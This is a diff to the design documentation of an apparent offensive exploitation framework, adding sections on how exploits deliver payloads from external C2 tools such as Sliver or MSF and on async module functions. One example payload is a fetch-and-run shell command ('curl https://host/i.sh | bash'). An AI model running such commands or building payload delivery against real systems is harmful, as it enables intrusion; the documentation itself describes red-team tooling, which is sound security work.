@@ -200,6 +200,22 @@ path always passes (freedom) and arrives typed `"external"`. Under the hood this
 Raw operator files (any path) stay first-class: they resolve with type `"external"`
 and the module stays authoritative. Freedom by default, typing when you want it.
 
+### The exploit ↔ payload relationship — external C2s on equal footing
+
+The exploit is a *delivery mechanism*; the payload store is merely one optional
+source among equals. The flexibility story is deliberately manual-first:
+
+- **External C2, zero wiring** — point the module's channels at a Sliver or
+  MSF artifact and the exploit delivers it. No framework involved.
+- **Manual by default** — the operator fills the info page by hand: a file
+  path (absolute or relative, `./payload`), a shell command
+  (`curl https://host/i.sh | bash`), or raw source.
+- **Automation only on command** — a *typed store payload* behaves like one
+  more external deliverable; its single convenience (the manifest dict, type-
+  checked, with the builder's `config` riding along) is granted ONLY when the
+  operator explicitly types `set payload <name>`. The framework never chooses
+  or fetches anything by itself.
+
 ### Multi-file modules
 
 A module may be a directory. The entry file carries `OPTIONS` + `run(opts)`; helpers
@@ -257,6 +273,9 @@ the framework enforces:
   *any* language the author pleases (Go, Nim, C, Rust, C#, bash, python,
   PowerShell…) and registers it in the store — exploits pick it up by name,
   type-filtered.
+- **Async is first-class** — `run()` may be a plain `def` or an `async def`; the
+  framework runs the event loop itself, foreground or as a managed background
+  job. An async listener needs zero thread/loop ceremony of its own.
 - **Typed payload store** — every artifact labeled (file-posix / file-win /
   shellcode / cmd / code) with a SHA-256 manifest
 - **No wire contract** — the kernel never connects anything, so it never enforces
